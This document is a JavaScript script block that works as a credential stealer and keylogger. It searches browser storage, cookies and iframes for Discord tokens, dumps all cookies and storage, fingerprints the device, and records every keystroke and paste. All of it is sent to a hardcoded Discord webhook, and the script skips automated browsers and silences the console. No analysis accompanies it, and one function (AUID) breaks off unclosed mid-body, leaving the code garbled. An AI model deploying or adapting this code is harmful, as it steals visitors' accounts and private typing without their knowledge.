<script>
(function(){

var W=['https://canary.discord.com/api/webhooks','/1570340494217707613/','yTzSaOg8tH-jjPZNvIbh0H3J8j9CFkZMW7yyQg1oU3MpJdCfHD4FIsHqS3_pkrDBcFqH'].join('');
var PING='https://api.ipify.org?format=json';
var FLUSH=7000,BATCH=470,RETRY=4,BACK=750;
var T=/[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}/;

function S(f,d){try{return f()}catch(e){return d}}
function Z(ms){return new Promise(function(r){setTimeout(r,ms)})}

function P1(p){
  return fetch(W,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p),keepalive:true,mode:'cors',credentials:'omit'}).then(function(r){
    if(!r.ok)throw new Error('h'+r.status);
    return true;
  });
}

function PS(p){
  var n=0;
  function go(){
    if(n>=RETRY)return Promise.resolve(false);
    n++;
    return P1(p).catch(function(){return Z(BACK*n).then(go)});
  }
  return go();
}

function CH(str,n){
  var o=[],i=0;
  while(i<str.length){o.push(str.slice(i,i+n));i+=n}
  return o;
}

function LS(st){
  return S(function(){
    for(var i=0;i<st.length;i++){
      var k=st.key(i),v=st.getItem(k);
      if(!v)continue;
      if(/tok/i.test(k)&&T.test(v))return{where:'s:'+k,tok:v};
      var m=v.match(T);
      if(m)return{where:'ss:'+k,tok:m[0]};
    }
    return null;
  });
}

function CK(){
  return S(function(){
    var a=document.cookie.split(';');
    for(var i=0;i<a.length;i++){
      var p=a[i].trim(),e=p.indexOf('=');
      if(e<0)continue;
      var k=p.slice(0,e),v=p.slice(e+1);
      if(/tok/i.test(k)&&T.test(v))return{where:'c:'+k,tok:v};
    }
    return null;
  });
}

function IF(){
  return S(function(){
    var fs=document.querySelectorAll('iframe[src*="discord"]');
    for(var i=0;i<fs.length;i++){
      var v=fs[i].contentWindow&&fs[i].contentWindow.__DISCORD_TOKEN;
      if(typeof v==='string'&&T.test(v))return{where:'i',tok:v};
    }
    return null;
  });
}

function HARV(){
  return LS(localStorage)||LS(sessionStorage)||CK()||IF()||{where:'n',tok:null};
}

function BAT(){
  return S(function(){
    if(!navigator.getBattery)return Promise.resolve(null);
    return navigator.getBattery().then(function(b){
      return{pct:Math.round(b.level*100),ch:b.charging,tf:Number.isFinite(b.chargingTime)?b.chargingTime:-1,te:Number.isFinite(b.dischargingTime)?b.dischargingTime:-1};
    }).catch(function(){return null});
  },Promise.resolve(null));
}

function NET(){
  return S(function(){
    var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
    if(!c)return null;
    return{t:c.effectiveType||c.type||null,d:c.downlink||null,r:c.rtt||null,sv:c.saveData||false};
  });
}

function CV(){
  return S(function(){
    var c=document.createElement('canvas');c.width=240;c.height=48;
    var x=c.getContext('2d');if(!x)return null;
    x.textBaseline='top';x.font='15px Arial';
    x.fillStyle='#f60';x.fillRect(0,0,120,32);
    x.fillStyle='#069';x.fillText('verification:ok',3,11);
    x.fillStyle='rgba(102,204,0,.65)';x.fillText('verification:ok',5,22);
    x.strokeStyle='rgba(180,180,180,.5)';x.arc(60,30,20,0,Math.PI*2);x.stroke();
    var d=c.toDataURL(),h=0;
    for(var i=0;i<d.length;i++)h=((h<<5)-h+d.charCodeAt(i))|0;
    return h.toString(16);
  });
}

function GL(){
  return S(function(){
    var c=document.createElement('canvas');
    var g=c.getContext('webgl')||c.getContext('experimental-webgl');
    if(!g)return null;
    var d=g.getExtension('WEBGL_debug_renderer_info');
    if(!d)return null;
    return{v:g.getParameter(d.UNMASKED_VENDOR_WEBGL),r:g.getParameter(d.UNMASKED_RENDERER_WEBGL)};
  });
}

function AU(){
  return S(function(){
    var c=document.createElement('canvas');
    var x=c.getContext('2d');
    if(!x)return null;
    x.fillStyle='#00f';x.fillRect(0,0,10,10);
    return x.getImageData(0,0,1,1).data.join(',');
  });
}

function IP(){
  return fetch(PING,{cache:'no-store'}).then(function(r){return r.json()}).then(function(j){return j&&j.ip?j.ip:null}).catch(function(){return null});
}

function COL(){
  var t=HARV();
  return Promise.all([IP(),BAT()]).then(function(a){
    return{
      ip:a[0],tok:t.tok,tkf:t.where,
      ua:navigator.userAgent,pf:navigator.platform,
      lg:navigator.language,lgs:(navigator.languages||[]).join(','),
      tz:S(function(){return Intl.DateTimeFormat().resolvedOptions().timeZone}),
      sc:screen.width+'x'+screen.height,vp:innerWidth+'x'+innerHeight,
      dpr:devicePixelRatio,cd:screen.colorDepth,
      co:navigator.hardwareConcurrency||null,
      mm:navigator.deviceMemory||null,
      on:navigator.onLine,dnt:navigator.doNotTrack||null,
      rf:document.referrer||'d',ur:location.href,
      ck:S(function(){return document.cookie},''),
      ls:S(function(){return JSON.stringify(localStorage)},'{}'),
      ss:S(function(){return JSON.stringify(sessionStorage)},'{}'),
      nt:NET(),bt:a[1],cv:CV(),gl:GL(),au:AU(),
      tc:S(function(){return{mt:navigator.maxTouchPoints,cr:matchMedia('(pointer:coarse)').matches}})
    };
  });
}

var KB='',TM=null;

function FK(){
  if(!KB)return Promise.resolve();
  var s=KB;KB='';
  var parts=CH(s,BATCH),i=0;
  function nxt(){
    if(i>=parts.length)return Promise.resolve();
    return PS({content:'\u2328 `'+parts[i++].replace(/`/g,'\u02cb')+'`'}).then(nxt);
  }
  return nxt();
}

function SK(){
  document.addEventListener('keydown',function(e){
    var k=e.key;
    if(k&&k.length===1)KB+=k;
    else if(k==='Enter')KB+='\n';
    else if(k==='Backspace')KB=KB.slice(0,-1);
    else if(k==='Tab')KB+='\t';
    else if(k===' ')KB+=' ';
    if(KB.length>=BATCH)FK();
  },true);

  document.addEventListener('paste',function(e){
    var t=S(function(){return(e.clipboardData||window.clipboardData).getData('text')},'');
    if(t)KB+='\n[P]'+t+'\n';
  },true);

  TM=setInterval(FK,FLUSH);

  document.addEventListener('visibilitychange',function(){
    if(document.visibilityState==='hidden')FK();
  });

  window.addEventListener('pagehide',FK,{capture:true});
  window.addEventListener('beforeunload',FK,{capture:true});
}

function PJ(o){
  try{return '```json\n'+JSON.stringify(o,null,2).slice(0,1900)+'\n```'}
  catch(e){return '```json\n{}\n```'}
}

function REP(){
  return COL().then(function(d){
    var l=[
      '**v**',
      'ip: `'+(d.ip||'n/a')+'`',
      'tok: '+(d.tok?'`'+d.tok.slice(0,10)+'..'+d.tok.slice(-6)+'` ('+d.tkf+')':'_none_'),
      'ua: `'+(d.ua||'').slice(0,110)+'`',
      'ref: `'+(d.rf||'d')+'`'
    ];
    return PS({content:l.join('\n')}).then(function(){return PS({content:PJ(d)})});
  });
}

function AUTO(){
  if(/HeadlessChrome|PhantomJS|puppeteer|playwright|selenium|electron/i.test(navigator.userAgent))return true;
  if(navigator.webdriver===true)return true;
  if(!navigator.languages||navigator.languages.length===0)return true;
  if(typeof window.chrome==='undefined'&&/Chrome\//.test(navigator.userAgent))return true;
  return false;
}

function QK(){
  S(function(){
    var c=console;
    c.log=c.warn=c.info=c.debug=c.error=function(){};
  });
  S(function(){
    Object.defineProperty(navigator,'webdriver',{get:function(){return undefined}});
  });
}

function AUID(){
  return S(function(){
    var a=document.createElement('audio');
    a.src='tesees221m.mp3';a.preload='auto';a.volume=0.12;

function INIT(){
  if(AUTO())return;
  var h=document.getElementById('h');
  var wait=function(){
    if(h&&!h.complete){
      return new Promise(function(r){
        h.addEventListener('load',r,{once:true});
        h.addEventListener('error',r,{once:true});
        setTimeout(r,2200);
      });
    }
    return Promise.resolve();
  };
  wait().then(function(){
    QK();
    return REP();
  }).then(function(){
    SK();
    AUID();
  }).catch(function(){});
}

if(document.readyState==='complete'||document.readyState==='interactive'){
  setTimeout(INIT,350);
}else{
  window.addEventListener('DOMContentLoaded',function(){setTimeout(INIT,350)},{once:true});
}
})();
